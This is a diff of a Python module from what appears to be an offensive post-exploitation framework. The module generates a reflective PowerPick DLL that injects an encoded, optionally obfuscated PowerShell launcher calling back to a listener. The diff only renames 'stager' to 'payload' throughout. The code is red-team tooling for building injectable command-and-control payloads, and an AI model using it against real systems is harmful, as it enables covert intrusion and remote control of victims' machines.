@@ -1,6 +1,6 @@
 from lib.common import helpers
 
-class Stager:
+class payload:
 
     def __init__(self, mainMenu, params=[]):
 
@@ -9,24 +9,24 @@ class Stager:
 
             'Author': ['@sixdub'],
 
-            'Description': ('Generate a PowerPick Reflective DLL to inject with stager code.'),
+            'Description': ('Generate a PowerPick Reflective DLL to inject with payload code.'),
 
             'Comments': [
                 ''
             ]
         }
 
-        # any options needed by the stager, settable during runtime
+        # any options needed by the payload, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
             'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
+                'Description'   :   'Listener to generate payload for.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'Language' : {
-                'Description'   :   'Language of the stager to generate.',
+                'Description'   :   'Language of the payload to generate.',
                 'Required'      :   True,
                 'Value'         :   'powershell'
             },
@@ -40,8 +40,8 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting.',
+            'payloadRetries' : {
+                'Description'   :   'Times for the payload to retry connecting.',
                 'Required'      :   False,
                 'Value'         :   '0'
             },
@@ -98,7 +98,7 @@ class Stager:
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
-        stagerRetries = self.options['StagerRetries']['Value']
+        payloadRetries = self.options['payloadRetries']['Value']
         obfuscate = self.options['Obfuscate']['Value']
         obfuscateCommand = self.options['ObfuscateCommand']['Value']
 
@@ -112,10 +112,10 @@ class Stager:
                 obfuscateScript = True
             
             if obfuscateScript and "launcher" in obfuscateCommand.lower():
-                print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager.")
+                print helpers.color("[!] If using obfuscation, LAUNCHER obfuscation cannot be used in the dll payload.")
                 return ""
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+            launcher = self.mainMenu.payloads.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, payloadRetries=payloadRetries)
 
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
@@ -123,6 +123,6 @@ class Stager:
             else:
                 launcherCode = launcher.split(" ")[-1]
 
-                dll = self.mainMenu.stagers.generate_dll(launcherCode, arch)
+                dll = self.mainMenu.payloads.generate_dll(launcherCode, arch)
 
                 return dll
